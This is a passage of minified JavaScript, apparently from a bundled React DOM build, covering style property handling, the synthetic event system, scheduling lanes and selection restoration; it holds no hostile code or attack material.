tu={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},jR=["Webkit","ms","Moz","O"];Object.keys(tu).forEach(function(n){jR.forEach(function(e){e=e+n.charAt(0).toUpperCase()+n.substring(1),tu[e]=tu[n]})});function nT(n,e,t){return e==null||typeof e=="boolean"||e===""?"":t||typeof e!="number"||e===0||tu.hasOwnProperty(n)&&tu[n]?(""+e).trim():e+"px"}function rT(n,e){n=n.style;for(var t in e)if(e.hasOwnProperty(t)){var r=t.indexOf("--")===0,i=nT(t,e[t],r);t==="float"&&(t="cssFloat"),r?n.setProperty(t,i):n[t]=i}}var VR=Kt({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function Ym(n,e){if(e){if(VR[n]&&(e.children!=null||e.dangerouslySetInnerHTML!=null))throw Error(le(137,n));if(e.dangerouslySetInnerHTML!=null){if(e.children!=null)throw Error(le(60));if(typeof e.dangerouslySetInnerHTML!="object"||!("__html"in e.dangerouslySetInnerHTML))throw Error(le(61))}if(e.style!=null&&typeof e.style!="object")throw Error(le(62))}}function Zm(n,e){if(n.indexOf("-")===-1)return typeof e.is=="string";switch(n){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Jm=null;function Xy(n){return n=n.target||n.srcElement||window,n.correspondingUseElement&&(n=n.correspondingUseElement),n.nodeType===3?n.parentNode:n}var Xm=null,gl=null,ml=null;function t_(n){if(n=ah(n)){if(typeof Xm!="function")throw Error(le(280));var e=n.stateNode;e&&(e=ap(e),Xm(n.stateNode,n.type,e))}}function iT(n){gl?ml?ml.push(n):ml=[n]:gl=n}function sT(){if(gl){var n=gl,e=ml;if(ml=gl=null,t_(n),e)for(n=0;n<e.length;n++)t_(e[n])}}function oT(n,e){return n(e)}function aT(){}var Sg=!1;function lT(n,e,t){if(Sg)return n(e,t);Sg=!0;try{return oT(n,e,t)}finally{Sg=!1,(gl!==null||ml!==null)&&(aT(),sT())}}function Eu(n,e){var t=n.stateNode;if(t===null)return null;var r=ap(t);if(r===null)return null;t=r[e];e:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(n=n.type,r=!(n==="button"||n==="input"||n==="select"||n==="textarea")),n=!r;break e;default:n=!1}if(n)return null;if(t&&typeof t!="function")throw Error(le(231,e,typeof t));return t}var e0=!1;if(ls)try{var Pc={};Object.defineProperty(Pc,"passive",{get:function(){e0=!0}}),window.addEventListener("test",Pc,Pc),window.removeEventListener("test",Pc,Pc)}catch{e0=!1}function FR(n,e,t,r,i,s,o,a,l){var u=Array.prototype.slice.call(arguments,3);try{e.apply(t,u)}catch(h){this.onError(h)}}var nu=!1,Yf=null,Zf=!1,t0=null,zR={onError:function(n){nu=!0,Yf=n}};function WR(n,e,t,r,i,s,o,a,l){nu=!1,Yf=null,FR.apply(zR,arguments)}function $R(n,e,t,r,i,s,o,a,l){if(WR.apply(this,arguments),nu){if(nu){var u=Yf;nu=!1,Yf=null}else throw Error(le(198));Zf||(Zf=!0,t0=u)}}function va(n){var e=n,t=n;if(n.alternate)for(;e.return;)e=e.return;else{n=e;do e=n,e.flags&4098&&(t=e.return),n=e.return;while(n)}return e.tag===3?t:null}function cT(n){if(n.tag===13){var e=n.memoizedState;if(e===null&&(n=n.alternate,n!==null&&(e=n.memoizedState)),e!==null)return e.dehydrated}return null}function n_(n){if(va(n)!==n)throw Error(le(188))}function HR(n){var e=n.alternate;if(!e){if(e=va(n),e===null)throw Error(le(188));return e!==n?null:n}for(var t=n,r=e;;){var i=t.return;if(i===null)break;var s=i.alternate;if(s===null){if(r=i.return,r!==null){t=r;continue}break}if(i.child===s.child){for(s=i.child;s;){if(s===t)return n_(i),n;if(s===r)return n_(i),e;s=s.sibling}throw Error(le(188))}if(t.return!==r.return)t=i,r=s;else{for(var o=!1,a=i.child;a;){if(a===t){o=!0,t=i,r=s;break}if(a===r){o=!0,r=i,t=s;break}a=a.sibling}if(!o){for(a=s.child;a;){if(a===t){o=!0,t=s,r=i;break}if(a===r){o=!0,r=s,t=i;break}a=a.sibling}if(!o)throw Error(le(189))}}if(t.alternate!==r)throw Error(le(190))}if(t.tag!==3)throw Error(le(188));return t.stateNode.current===t?n:e}function uT(n){return n=HR(n),n!==null?hT(n):null}function hT(n){if(n.tag===5||n.tag===6)return n;for(n=n.child;n!==null;){var e=hT(n);if(e!==null)return e;n=n.sibling}return null}var fT=Nr.unstable_scheduleCallback,r_=Nr.unstable_cancelCallback,qR=Nr.unstable_shouldYield,KR=Nr.unstable_requestPaint,rn=Nr.unstable_now,GR=Nr.unstable_getCurrentPriorityLevel,ew=Nr.unstable_ImmediatePriority,dT=Nr.unstable_UserBlockingPriority,Jf=Nr.unstable_NormalPriority,QR=Nr.unstable_LowPriority,pT=Nr.unstable_IdlePriority,rp=null,bi=null;function YR(n){if(bi&&typeof bi.onCommitFiberRoot=="function")try{bi.onCommitFiberRoot(rp,n,void 0,(n.current.flags&128)===128)}catch{}}var ci=Math.clz32?Math.clz32:XR,ZR=Math.log,JR=Math.LN2;function XR(n){return n>>>=0,n===0?32:31-(ZR(n)/JR|0)|0}var $h=64,Hh=4194304;function Hc(n){switch(n&-n){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return n&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return n}}function Xf(n,e){var t=n.pendingLanes;if(t===0)return 0;var r=0,i=n.suspendedLanes,s=n.pingedLanes,o=t&268435455;if(o!==0){var a=o&~i;a!==0?r=Hc(a):(s&=o,s!==0&&(r=Hc(s)))}else o=t&~i,o!==0?r=Hc(o):s!==0&&(r=Hc(s));if(r===0)return 0;if(e!==0&&e!==r&&!(e&i)&&(i=r&-r,s=e&-e,i>=s||i===16&&(s&4194240)!==0))return e;if(r&4&&(r|=t&16),e=n.entangledLanes,e!==0)for(n=n.entanglements,e&=r;0<e;)t=31-ci(e),i=1<<t,r|=n[t],e&=~i;return r}function eM(n,e){switch(n){case 1:case 2:case 4:return e+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function tM(n,e){for(var t=n.suspendedLanes,r=n.pingedLanes,i=n.expirationTimes,s=n.pendingLanes;0<s;){var o=31-ci(s),a=1<<o,l=i[o];l===-1?(!(a&t)||a&r)&&(i[o]=eM(a,e)):l<=e&&(n.expiredLanes|=a),s&=~a}}function n0(n){return n=n.pendingLanes&-1073741825,n!==0?n:n&1073741824?1073741824:0}function gT(){var n=$h;return $h<<=1,!($h&4194240)&&($h=64),n}function Tg(n){for(var e=[],t=0;31>t;t++)e.push(n);return e}function sh(n,e,t){n.pendingLanes|=e,e!==536870912&&(n.suspendedLanes=0,n.pingedLanes=0),n=n.eventTimes,e=31-ci(e),n[e]=t}function nM(n,e){var t=n.pendingLanes&~e;n.pendingLanes=e,n.suspendedLanes=0,n.pingedLanes=0,n.expiredLanes&=e,n.mutableReadLanes&=e,n.entangledLanes&=e,e=n.entanglements;var r=n.eventTimes;for(n=n.expirationTimes;0<t;){var i=31-ci(t),s=1<<i;e[i]=0,r[i]=-1,n[i]=-1,t&=~s}}function tw(n,e){var t=n.entangledLanes|=e;for(n=n.entanglements;t;){var r=31-ci(t),i=1<<r;i&e|n[r]&e&&(n[r]|=e),t&=~i}}var ft=0;function mT(n){return n&=-n,1<n?4<n?n&268435455?16:536870912:4:1}var yT,nw,wT,vT,_T,r0=!1,qh=[],Qs=null,Ys=null,Zs=null,Iu=new Map,Su=new Map,Ds=[],rM="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function i_(n,e){switch(n){case"focusin":case"focusout":Qs=null;break;case"dragenter":case"dragleave":Ys=null;break;case"mouseover":case"mouseout":Zs=null;break;case"pointerover":case"pointerout":Iu.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":Su.delete(e.pointerId)}}function Lc(n,e,t,r,i,s){return n===null||n.nativeEvent!==s?(n={blockedOn:e,domEventName:t,eventSystemFlags:r,nativeEvent:s,targetContainers:[i]},e!==null&&(e=ah(e),e!==null&&nw(e)),n):(n.eventSystemFlags|=r,e=n.targetContainers,i!==null&&e.indexOf(i)===-1&&e.push(i),n)}function iM(n,e,t,r,i){switch(e){case"focusin":return Qs=Lc(Qs,n,e,t,r,i),!0;case"dragenter":return Ys=Lc(Ys,n,e,t,r,i),!0;case"mouseover":return Zs=Lc(Zs,n,e,t,r,i),!0;case"pointerover":var s=i.pointerId;return Iu.set(s,Lc(Iu.get(s)||null,n,e,t,r,i)),!0;case"gotpointercapture":return s=i.pointerId,Su.set(s,Lc(Su.get(s)||null,n,e,t,r,i)),!0}return!1}function ET(n){var e=$o(n.target);if(e!==null){var t=va(e);if(t!==null){if(e=t.tag,e===13){if(e=cT(t),e!==null){n.blockedOn=e,_T(n.priority,function(){wT(t)});return}}else if(e===3&&t.stateNode.current.memoizedState.isDehydrated){n.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}n.blockedOn=null}function If(n){if(n.blockedOn!==null)return!1;for(var e=n.targetContainers;0<e.length;){var t=i0(n.domEventName,n.eventSystemFlags,e[0],n.nativeEvent);if(t===null){t=n.nativeEvent;var r=new t.constructor(t.type,t);Jm=r,t.target.dispatchEvent(r),Jm=null}else return e=ah(t),e!==null&&nw(e),n.blockedOn=t,!1;e.shift()}return!0}function s_(n,e,t){If(n)&&t.delete(e)}function sM(){r0=!1,Qs!==null&&If(Qs)&&(Qs=null),Ys!==null&&If(Ys)&&(Ys=null),Zs!==null&&If(Zs)&&(Zs=null),Iu.forEach(s_),Su.forEach(s_)}function Dc(n,e){n.blockedOn===e&&(n.blockedOn=null,r0||(r0=!0,Nr.unstable_scheduleCallback(Nr.unstable_NormalPriority,sM)))}function Tu(n){function e(i){return Dc(i,n)}if(0<qh.length){Dc(qh[0],n);for(var t=1;t<qh.length;t++){var r=qh[t];r.blockedOn===n&&(r.blockedOn=null)}}for(Qs!==null&&Dc(Qs,n),Ys!==null&&Dc(Ys,n),Zs!==null&&Dc(Zs,n),Iu.forEach(e),Su.forEach(e),t=0;t<Ds.length;t++)r=Ds[t],r.blockedOn===n&&(r.blockedOn=null);for(;0<Ds.length&&(t=Ds[0],t.blockedOn===null);)ET(t),t.blockedOn===null&&Ds.shift()}var yl=vs.ReactCurrentBatchConfig,ed=!0;function oM(n,e,t,r){var i=ft,s=yl.transition;yl.transition=null;try{ft=1,rw(n,e,t,r)}finally{ft=i,yl.transition=s}}function aM(n,e,t,r){var i=ft,s=yl.transition;yl.transition=null;try{ft=4,rw(n,e,t,r)}finally{ft=i,yl.transition=s}}function rw(n,e,t,r){if(ed){var i=i0(n,e,t,r);if(i===null)Lg(n,e,r,td,t),i_(n,r);else if(iM(i,n,e,t,r))r.stopPropagation();else if(i_(n,r),e&4&&-1<rM.indexOf(n)){for(;i!==null;){var s=ah(i);if(s!==null&&yT(s),s=i0(n,e,t,r),s===null&&Lg(n,e,r,td,t),s===i)break;i=s}i!==null&&r.stopPropagation()}else Lg(n,e,r,null,t)}}var td=null;function i0(n,e,t,r){if(td=null,n=Xy(r),n=$o(n),n!==null)if(e=va(n),e===null)n=null;else if(t=e.tag,t===13){if(n=cT(e),n!==null)return n;n=null}else if(t===3){if(e.stateNode.current.memoizedState.isDehydrated)return e.tag===3?e.stateNode.containerInfo:null;n=null}else e!==n&&(n=null);return td=n,null}function IT(n){switch(n){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(GR()){case ew:return 1;case dT:return 4;case Jf:case QR:return 16;case pT:return 536870912;default:return 16}default:return 16}}var Fs=null,iw=null,Sf=null;function ST(){if(Sf)return Sf;var n,e=iw,t=e.length,r,i="value"in Fs?Fs.value:Fs.textContent,s=i.length;for(n=0;n<t&&e[n]===i[n];n++);var o=t-n;for(r=1;r<=o&&e[t-r]===i[s-r];r++);return Sf=i.slice(n,1<r?1-r:void 0)}function Tf(n){var e=n.keyCode;return"charCode"in n?(n=n.charCode,n===0&&e===13&&(n=13)):n=e,n===10&&(n=13),32<=n||n===13?n:0}function Kh(){return!0}function o_(){return!1}function Lr(n){function e(t,r,i,s,o){this._reactName=t,this._targetInst=i,this.type=r,this.nativeEvent=s,this.target=o,this.currentTarget=null;for(var a in n)n.hasOwnProperty(a)&&(t=n[a],this[a]=t?t(s):s[a]);return this.isDefaultPrevented=(s.defaultPrevented!=null?s.defaultPrevented:s.returnValue===!1)?Kh:o_,this.isPropagationStopped=o_,this}return Kt(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=Kh)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=Kh)},persist:function(){},isPersistent:Kh}),e}var tc={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(n){return n.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},sw=Lr(tc),oh=Kt({},tc,{view:0,detail:0}),lM=Lr(oh),Ag,bg,Oc,ip=Kt({},oh,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:ow,button:0,buttons:0,relatedTarget:function(n){return n.relatedTarget===void 0?n.fromElement===n.srcElement?n.toElement:n.fromElement:n.relatedTarget},movementX:function(n){return"movementX"in n?n.movementX:(n!==Oc&&(Oc&&n.type==="mousemove"?(Ag=n.screenX-Oc.screenX,bg=n.screenY-Oc.screenY):bg=Ag=0,Oc=n),Ag)},movementY:function(n){return"movementY"in n?n.movementY:bg}}),a_=Lr(ip),cM=Kt({},ip,{dataTransfer:0}),uM=Lr(cM),hM=Kt({},oh,{relatedTarget:0}),xg=Lr(hM),fM=Kt({},tc,{animationName:0,elapsedTime:0,pseudoElement:0}),dM=Lr(fM),pM=Kt({},tc,{clipboardData:function(n){return"clipboardData"in n?n.clipboardData:window.clipboardData}}),gM=Lr(pM),mM=Kt({},tc,{data:0}),l_=Lr(mM),yM={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},wM={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},vM={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function _M(n){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(n):(n=vM[n])?!!e[n]:!1}function ow(){return _M}var EM=Kt({},oh,{key:function(n){if(n.key){var e=yM[n.key]||n.key;if(e!=="Unidentified")return e}return n.type==="keypress"?(n=Tf(n),n===13?"Enter":String.fromCharCode(n)):n.type==="keydown"||n.type==="keyup"?wM[n.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:ow,charCode:function(n){return n.type==="keypress"?Tf(n):0},keyCode:function(n){return n.type==="keydown"||n.type==="keyup"?n.keyCode:0},which:function(n){return n.type==="keypress"?Tf(n):n.type==="keydown"||n.type==="keyup"?n.keyCode:0}}),IM=Lr(EM),SM=Kt({},ip,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),c_=Lr(SM),TM=Kt({},oh,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:ow}),AM=Lr(TM),bM=Kt({},tc,{propertyName:0,elapsedTime:0,pseudoElement:0}),xM=Lr(bM),kM=Kt({},ip,{deltaX:function(n){return"deltaX"in n?n.deltaX:"wheelDeltaX"in n?-n.wheelDeltaX:0},deltaY:function(n){return"deltaY"in n?n.deltaY:"wheelDeltaY"in n?-n.wheelDeltaY:"wheelDelta"in n?-n.wheelDelta:0},deltaZ:0,deltaMode:0}),CM=Lr(kM),RM=[9,13,27,32],aw=ls&&"CompositionEvent"in window,ru=null;ls&&"documentMode"in document&&(ru=document.documentMode);var MM=ls&&"TextEvent"in window&&!ru,TT=ls&&(!aw||ru&&8<ru&&11>=ru),u_=String.fromCharCode(32),h_=!1;function AT(n,e){switch(n){case"keyup":return RM.indexOf(e.keyCode)!==-1;case"keydown":return e.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function bT(n){return n=n.detail,typeof n=="object"&&"data"in n?n.data:null}var Xa=!1;function NM(n,e){switch(n){case"compositionend":return bT(e);case"keypress":return e.which!==32?null:(h_=!0,u_);case"textInput":return n=e.data,n===u_&&h_?null:n;default:return null}}function PM(n,e){if(Xa)return n==="compositionend"||!aw&&AT(n,e)?(n=ST(),Sf=iw=Fs=null,Xa=!1,n):null;switch(n){case"paste":return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return TT&&e.locale!=="ko"?null:e.data;default:return null}}var LM={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function f_(n){var e=n&&n.nodeName&&n.nodeName.toLowerCase();return e==="input"?!!LM[n.type]:e==="textarea"}function xT(n,e,t,r){iT(r),e=nd(e,"onChange"),0<e.length&&(t=new sw("onChange","change",null,t,r),n.push({event:t,listeners:e}))}var iu=null,Au=null;function DM(n){UT(n,0)}function sp(n){var e=nl(n);if(ZS(e))return n}function OM(n,e){if(n==="change")return e}var kT=!1;if(ls){var kg;if(ls){var Cg="oninput"in document;if(!Cg){var d_=document.createElement("div");d_.setAttribute("oninput","return;"),Cg=typeof d_.oninput=="function"}kg=Cg}else kg=!1;kT=kg&&(!document.documentMode||9<document.documentMode)}function p_(){iu&&(iu.detachEvent("onpropertychange",CT),Au=iu=null)}function CT(n){if(n.propertyName==="value"&&sp(Au)){var e=[];xT(e,Au,n,Xy(n)),lT(DM,e)}}function BM(n,e,t){n==="focusin"?(p_(),iu=e,Au=t,iu.attachEvent("onpropertychange",CT)):n==="focusout"&&p_()}function UM(n){if(n==="selectionchange"||n==="keyup"||n==="keydown")return sp(Au)}function jM(n,e){if(n==="click")return sp(e)}function VM(n,e){if(n==="input"||n==="change")return sp(e)}function FM(n,e){return n===e&&(n!==0||1/n===1/e)||n!==n&&e!==e}var pi=typeof Object.is=="function"?Object.is:FM;function bu(n,e){if(pi(n,e))return!0;if(typeof n!="object"||n===null||typeof e!="object"||e===null)return!1;var t=Object.keys(n),r=Object.keys(e);if(t.length!==r.length)return!1;for(r=0;r<t.length;r++){var i=t[r];if(!Vm.call(e,i)||!pi(n[i],e[i]))return!1}return!0}function g_(n){for(;n&&n.firstChild;)n=n.firstChild;return n}function m_(n,e){var t=g_(n);n=0;for(var r;t;){if(t.nodeType===3){if(r=n+t.textContent.length,n<=e&&r>=e)return{node:t,offset:e-n};n=r}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=g_(t)}}function RT(n,e){return n&&e?n===e?!0:n&&n.nodeType===3?!1:e&&e.nodeType===3?RT(n,e.parentNode):"contains"in n?n.contains(e):n.compareDocumentPosition?!!(n.compareDocumentPosition(e)&16):!1:!1}function MT(){for(var n=window,e=Qf();e instanceof n.HTMLIFrameElement;){try{var t=typeof e.contentWindow.location.href=="string"}catch{t=!1}if(t)n=e.contentWindow;else break;e=Qf(n.document)}return e}function lw(n){var e=n&&n.nodeName&&n.nodeName.toLowerCase();return e&&(e==="input"&&(n.type==="text"||n.type==="search"||n.type==="tel"||n.type==="url"||n.type==="password")||e==="textarea"||n.contentEditable==="true")}function zM(n){var e=MT(),t=n.focusedElem,r=n.selectionRange;if(e!==t&&t&&t.ownerDocument&&RT(t.ownerDocument.documentElement,t)){if(r!==null&&lw(t)){if(e=r.start,n=r.end,n===void 0&&(n=e),"selectionStart"in t)t.selectionStart=e,t.selectionEnd=Math.min(n,t.value.length);else if(n=(e=t.ownerDocument||document)&&e.defaultView||window,n.getSelection){n=n.getSelection();var i=t.textContent.length,s=Math.min(r.start,i);r=r.end===void 0?s:Math.min(r.end,i),!n.extend&&s>r&&(i=r,r=s,s=i),i=m_(t,s);var o=m_(t,r);i&&o&&(n.rangeCount!==1||n.anchorNode!==i.node||n.anchorOffset!==i.offset||n.focusNode!==o.node||n.focusOffset!==o.offset)&&(e=e.createRange(),e.setStart(i.node,i.offset),n.removeAllRanges(),s>r?(n.addRange(e),n.extend(o.node,o.offset)):(e.setEnd(o.node,o.offset),n.addRange(e)))}}for(e=[],n=t;n=n.parentNode;)n.nodeType===1&&e.push({element:n,left:n.scrollLeft,top:n.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<e.length;t++)n=e[t],n.element.scrollLeft=n.left,n.element.scrollTop=n.top}}var WM=ls&&"documentMode"in document&&11>=document.documentMode,el=null,s0=null,su=null,o0=!1;function y_(n,e,t){var r=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;o0||el==null||el!==Qf(r)||(r=el,"selectionStart"in r&&lw(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),su&&bu(su,r)||(su=r,r=nd(s0,"onSelect"),0<r.length&&(e=new sw("onSelect","select",null,e,t),n.push({event:e,listeners:r}),e.target=el)))}function Gh(n,e){var t={};return t[n.toLowerCase()]=e.toLowerCase(),t["Webkit"+n]="webkit"+e,t["Moz"+n]="moz"+e,t}var tl={animationend:Gh("Animation","AnimationEnd"),animationiteration:Gh("Animation","AnimationIteration"),animationstart:Gh("Animation","AnimationStart"),transitionend:Gh("Transition","TransitionEnd")},Rg={},NT={};ls&&(NT=document.createElement("div").style,"AnimationEvent"in window||(delete tl.animationend.animation,delete tl.animationiteration.animation,delete tl.animationstart.animation),"TransitionEvent"in window||delete tl.transitionend.transition);function op(n){if(Rg[n])return Rg[n];if(!tl[n])return n;var e=tl[n],t;for(t in e)if(e.hasOwnProperty(t)&&t in NT)return Rg[n]=e[t];return n}var PT=op("animationend"),LT=op("animationiteration"),DT=op("animationstart"),OT=op("transitionend"),BT=new Map,w_="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Io(n,e){BT.set(n,e),wa(e,[n])}for(var Mg=0;Mg<w_.length;Mg++){var Ng=w_[Mg],$M=Ng.toLowerCase(),HM=Ng[0].toUpperCase()+Ng.slice(1);Io($M,"on"+HM)}Io(PT,"onAnimationEnd");Io(LT,"onAnimationIteration");Io(DT,"onAnimationStart");Io("dblclick","onDoubleClick");Io("focusin","onFocus");Io("focusout","onBlur");Io(OT,"onTransitionEnd");kl("onMouseEnter",["mouseout","mouseover"]);kl("onMouseLeave",["mouseout","mouseover"]);kl("onPointerEnter",["pointerout","pointerover"]);kl("onPointerLeave",["pointerout","pointerover"]);wa("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));wa("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));wa("onBeforeInput",["compositionend","keypress","textInput","paste"]);wa("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));wa("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));wa("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var qc="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),qM=new Set("cancel close invalid load scroll toggle".split(" ").concat(qc));function v_(n,e,t){var r=n.type||"unknown-event";n.currentTarget=t,$R(r,e,void 0,n),n.currentTarget=null}function UT(n,e){e=(e&4)!==0;for(var t=0;t<n.length;t++){var r=n[t],i=r.event;r=r.listeners;e:{var s=void 0;if(e)for(var o=r.length-1;0<=o;o--){var a=r[o],l=a.instance,u=a.currentTarget;if(a=a.listener,l!==s&&i.isPropagationStopped())break e;v_(i,a,u),s=l}else for(o=0;o<r.length;o++){if(a=r[o],l=a.instance,u=a.currentTarget,a=a.listener,l!==s&&i.isPropagationStopped())break e;v_(i,a,u),s=l}}}if(Zf)throw n=t0,Zf=!1,t0=null,n}function Ct(n,e){var t=e[h0];t===void 0&&(t=e[h0]=new Set);var r=n+"__bubble";t.has(r)||(jT(e,n,2,!1),t.add(r))}function Pg(n,e,t){var r=0;e&&(r|=4),jT(t,n,r,e)}var Qh="_reactListening"+Math.random().toString(36).slice(2);function xu(n){if(!n[Qh]){n[Qh]=!0,qS.forEach(function(t){t!=="selectionchange"&&(qM.has(t)||Pg(t,!1,n),Pg(t,!0,n))});var e=n.nodeType===9?n:n.ownerDocument;e===null||e[Qh]||(e[Qh]=!0,Pg("selectionchange",!1,e))}}function jT(n,e,t,r){switch(IT(e)){case 1:var i=oM;break;case 4:i=aM;break;default:i=rw}t=i.bind(null,e,t,n),i=void 0,!e0||e!=="touchstart"&&e!=="touchmove"&&e!=="wheel"||(i=!0),r?i!==void 0?n.addEventListener(e,t,{capture:!0,passive:i}):n.addEventListener(e,t,!0):i!==void 0?n.addEventListener(e,t,{passive:i}):n.addEventListener(e,t,!1)}function Lg(n,e,t,r,i){var s=r;if(!(e&1)&&!(e&2)&&r!==null)e:for(;;){if(r===null)return;var o=r.tag;if(o===3||o===4){var a=r.stateNode.containerInfo;if(a===i||a.nodeType===8&&a.parentNode===i)break;if(o===4)for(o=r.return;o!==null;){var l=o.tag;if((l===3||l===4)&&(l=o.stateNode.containerInfo,l===i||l.nodeType===8&&l.parentNode===i))return;o=o.return}for(;a!==null;){if(o=$o(a),o===null)return;if(l=o.tag,l===5||l===6){r=s=o;continue e}a=a.parentNode}}r=r.return}lT(function(){var u=s,h=Xy(t),f=[];e:{var p=BT.get(n);if(p!==void 0){var w=sw,x=n;switch(n){case"keypress":if(Tf(t)===0)break 